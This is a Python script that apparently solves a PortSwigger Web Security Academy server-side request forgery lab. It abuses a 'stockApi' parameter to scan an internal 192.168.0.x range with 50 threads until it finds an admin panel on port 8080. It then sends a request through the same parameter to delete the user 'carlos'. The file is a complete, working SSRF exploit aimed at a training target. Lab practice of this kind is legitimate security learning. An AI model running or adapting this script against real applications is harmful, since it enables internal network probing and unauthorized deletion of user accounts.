import requests
from threading import Event
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()

# Edit the url
url = "https://0abb006803a87240827edd900068003c.web-security-academy.net/product/stock"

global r
r = requests.Session()

stop_event = Event()  # for breaking the loop

found_range = None  # for storing the range that has been found

def enumerate_range(i):
    global found_range
    if stop_event.is_set():
        return
    for_check_range = {
        'stockApi': "http://192.168.0.{}:8080/admin".format(i)
    }
    a = r.post(url, verify=False, data=for_check_range)
    if a.status_code == 200:
        print(f"Found range was {i}")
        found_range = i
        stop_event.set()

def threading_range():  # Pool of 50 threads
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(enumerate_range, range(1, 256))

def execute_delete_user():
    try:
        global found_range
        for_delete_user = {
            'stockApi': "http://192.168.0.{}:8080/admin/delete?username=carlos".format(found_range)
        }
        r.post(url, verify=False, data=for_delete_user)
        print("Lab solved!")
    except requests.exceptions.ConnectTimeout:
        print("Lab solved!")


if __name__ == "__main__":
    threading_range()
    execute_delete_user()